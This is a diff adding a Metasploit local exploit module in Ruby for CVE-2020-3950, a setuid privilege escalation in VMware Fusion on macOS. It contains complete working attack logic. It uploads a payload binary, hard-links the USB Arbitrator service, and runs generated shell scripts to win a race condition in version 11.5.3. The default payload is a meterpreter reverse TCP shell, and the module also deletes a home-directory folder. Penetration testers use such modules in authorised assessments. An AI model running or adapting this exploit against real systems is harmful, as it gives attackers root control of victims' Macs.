@@ -1,0 +1,240 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = ExcellentRanking
+
+  include Msf::Post::OSX::Priv
+  include Msf::Post::File
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name'           => 'VMware Fusion USB Arbitrator Setuid Privilege Escalation',
+        'Description'    => %q(
+          This exploits an improper use of setuid binaries within VMware Fusion 10.1.3 - 11.5.3.
+          The Open VMware USB Arbitrator Service can be launched outide of its standard path
+          which allows loading of an attacker controlled binary.  By creating a payload in the
+          user home directory in a specific folder, and creating a hard link to the 'Open VMware
+          USB Arbitrator Service' binary, we're able to launch it temporarily to start our payload
+          with an effective UID of 0.
+          @jeffball55 discovered an incomplete patch in 11.5.3 with a TOCTOU race.
+          Successfully tested against 10.1.6, 11.5.1, 11.5.2, and 11.5.3.
+        ),
+        'License'        => MSF_LICENSE,
+        'Author'         =>
+          [
+            'h00die', # msf module
+            'Dhanesh Kizhakkinan', # discovery
+            'Rich Mirch', # edb module
+            'jeffball <jeffball@dc949.org>', # 11.5.3 exploit
+            'grimm'
+          ],
+        'Platform'       => [ 'osx' ],
+        'Arch'           => [ ARCH_X86, ARCH_X64 ],
+        'SessionTypes'   => [ 'shell', 'meterpreter' ],
+        'Targets'        => [[ 'Auto', {} ]],
+        'Privileged'     => true,
+        'References'     =>
+          [
+            [ 'CVE', '2020-3950' ],
+            [ 'EDB', '48235' ],
+            [ 'URL', 'https://www.vmware.com/security/advisories/VMSA-2020-0005.html' ],
+            [ 'URL', 'https://twitter.com/jeffball55/status/1242530508053110785?s=20' ],
+            [ 'URL', 'https://github.com/grimm-co/NotQuite0DayFriday/blob/master/2020.03.17-vmware-fusion/notes.txt' ]
+          ],
+        'DisclosureDate' => 'Mar 17 2020',
+        'DefaultOptions' =>
+          {
+            'PAYLOAD'    => 'osx/x64/meterpreter_reverse_tcp',
+            'WfsDelay'   => 15
+          }
+      )
+    )
+
+    register_options [
+      OptInt.new('MAXATTEMPTS', [true, 'Maximum attempts to win race for 11.5.3', 75])
+    ]
+
+    register_advanced_options [
+      OptBool.new('ForceExploit', [false, 'Override check result', false])
+    ]
+  end
+
+  def open_usb_service
+    'Open VMware USB Arbitrator Service'
+  end
+
+  def usb_service
+    'VMware USB Arbitrator Service'
+  end
+
+  def get_home_dir
+    home = cmd_exec 'echo ~'
+    if home.blank?
+      fail_with Failure::BadConfig, 'Unable to determine home dir for shell.'
+    end
+    home
+  end
+
+  def content_dir
+    "#{get_home_dir}/Contents"
+  end
+
+  def base_dir
+    "#{content_dir}/Library/services/"
+  end
+
+  def kill_process(executable)
+    pid_kill = cmd_exec %(ps ax | grep #{executable} | grep -v grep | awk '{print "kill -9 " $1}')
+    cmd_exec pid_kill
+  end
+
+  def get_version
+    # Thanks to @ddouhine on github for this answer!
+    version_raw = cmd_exec "plutil -p '/Applications/VMware Fusion.app/Contents/Info.plist' | grep CFBundleShortVersionString"
+    /=> "(?<version>\d{0,2}\.\d{0,2}\.\d{0,2})"/ =~ version_raw #supposed 11.x is also vulnerable, but everyone whos tested shows 11.5.1 or 11.5.2
+    if version_raw.blank?
+      fail_with Failure::BadConfig, 'Unable to determine VMware Fusion version.  Set ForceExploit to override.'
+    end
+    Gem::Version.new(version)
+  end
+
+  def pre_11_5_3
+    # Upload payload executable & chmod
+    payload_filename = "#{base_dir}#{usb_service}"
+    print_status "Uploading Payload: #{payload_filename}"
+    write_file payload_filename, generate_payload_exe
+    chmod payload_filename, 0o755
+    register_file_for_cleanup payload_filename
+
+    # create folder structure and hard link to the original binary
+    root_link_folder = "#{get_home_dir}/#{rand_text_alphanumeric(2..5)}" # for cleanup later
+    link_folder = "#{root_link_folder}/#{rand_text_alphanumeric(2..5)}/#{rand_text_alphanumeric(2..5)}/"
+    cmd_exec "mkdir -p #{link_folder}"
+    cmd_exec "ln '/Applications/VMware Fusion.app/Contents/Library/services/#{open_usb_service}' '#{link_folder}#{open_usb_service}'"
+    print_status "Created folder (#{link_folder}) and link"
+
+    print_status 'Starting USB Service (5 sec pause)'
+    # XXX: The ; used by cmd_exec will interfere with &, so pad it with :
+    cmd_exec "cd #{link_folder}; '#{link_folder}/#{open_usb_service}' & :"
+    Rex.sleep 5 # give time for the service to execute our payload
+    print_status 'Killing service'
+    cmd_exec "pkill '#{open_usb_service}'"
+    print_status "Deleting #{root_link_folder}"
+    rm_rf root_link_folder
+  end
+
+  def exactly_11_5_3
+    # Upload payload executable & chmod
+    payload_name = "#{base_dir}#{rand_text_alphanumeric(5..10)}"
+    print_status "Uploading Payload to #{payload_name}"
+    write_file payload_name, generate_payload_exe
+    chmod payload_name, 0o755
+    #create race with codesign check
+    root_link_folder = "#{get_home_dir}/#{rand_text_alphanumeric(2..5)}" # for cleanup later
+    link_folder = "#{root_link_folder}/#{rand_text_alphanumeric(2..5)}/#{rand_text_alphanumeric(2..5)}/"
+    print_status 'Uploading race condition executable.'
+    race = <<~EOF
+      #!/bin/sh
+      while [ "1" = "1" ]; do
+          ln -f '/Applications/VMware Fusion.app/Contents/Library/services/#{usb_service}' '#{base_dir}#{usb_service}'
+          ln -f '#{payload_name}' '#{base_dir}#{usb_service}'
+      done
+    EOF
+    racer_name = "#{base_dir}#{rand_text_alphanumeric(5..10)}"
+    upload_and_chmodx racer_name, race
+    register_file_for_cleanup racer_name
+    register_dirs_for_cleanup root_link_folder
+    # create the hard link
+    print_status "Creating folder (#{link_folder}) and link"
+    cmd_exec "mkdir -p #{link_folder}"
+    cmd_exec "ln '/Applications/VMware Fusion.app/Contents/Library/services/#{open_usb_service}' '#{link_folder}#{open_usb_service}'"
+
+    # create the launcher to start the racer and keep launching our service to attempt to win
+    launcher = <<~EOF
+      #!/bin/sh
+      #{racer_name} &
+      for i in {1..#{datastore['MAXATTEMPTS']}}
+      do
+          echo "attempt $i";
+          '#{link_folder}#{open_usb_service}'
+      done
+    EOF
+    runner_name = "#{base_dir}#{rand_text_alphanumeric(5..10)}"
+    upload_and_chmodx runner_name, launcher
+    register_file_for_cleanup runner_name
+
+    print_status "Launching Exploit #{runner_name} (sleeping 15sec)"
+    # XXX: The ; used by cmd_exec will interfere with &, so pad it with :
+    results = cmd_exec "#{runner_name} & :"
+    Rex.sleep 15 # give time for the service to execute our payload
+    vprint_status results
+
+    print_status 'Exploit Finished, killing scripts.'
+    kill_process racer_name
+    kill_process runner_name # in theory should be killed already but just in case
+    kill_process "'#{link_folder}#{open_usb_service}'"
+    # kill_process 'ln' a rogue ln -f may mess us up, but killing them seemed to be unreliable and mark the exploit as failed.
+    # above caused: [-] Exploit failed: Rex::Post::Meterpreter::RequestError stdapi_sys_process_execute: Operation failed: Unknown error
+    # rm_rf base_dir # this always fails. Leaving it here as a note that when things dont kill well, can't delete the folder
+  end
+
+  def check
+    unless exists? "/Applications/VMware Fusion.app/Contents/Library/services/#{open_usb_service}"
+      print_bad "'#{open_usb_service}' binary missing"
+      return CheckCode::Safe
+    end
+    version = get_version
+    if version.between?(Gem::Version.new('10.1.3'), Gem::Version.new('11.5.3'))
+      vprint_good "Vmware Fusion #{version} is exploitable"
+    else
+      print_bad "VMware Fusion #{version} is NOT exploitable"
+      return CheckCode::Safe
+    end
+    CheckCode::Appears
+  end
+
+  def exploit
+    # First check the system is vulnerable, or the user wants to run regardless
+    unless check == CheckCode::Appears
+      unless datastore['ForceExploit']
+        fail_with Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override.'
+      end
+      print_warning 'Target does not appear to be vulnerable'
+    end
+
+    # Check if we're already root
+    if is_root?
+      unless datastore['ForceExploit']
+        fail_with Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override'
+      end
+    end
+
+    # Make sure we can write our payload to the remote system
+    rm_rf content_dir # live dangerously.
+    if directory? content_dir
+      fail_with Filure::BadConfig, "#{content_dir} exists. Unable to delete automatically.  Please delete or exploit will fail."
+    end
+    cmd_exec "mkdir -p #{base_dir}"
+    register_dirs_for_cleanup content_dir
+    unless writable? base_dir
+      fail_with Failure::BadConfig, "#{base_dir} is not writable."
+    end
+
+    version = get_version
+    if version == Gem::Version.new('11.5.3')
+      vprint_status 'Using 11.5.3 exploit'
+      exactly_11_5_3
+    elsif version.between?(Gem::Version.new('10.1.3'), Gem::Version.new('11.5.2'))
+      vprint_status 'Using pre-11.5.3 exploit'
+      pre_11_5_3
+    end
+    rm_rf content_dir # live dangerously.
+  end
+end
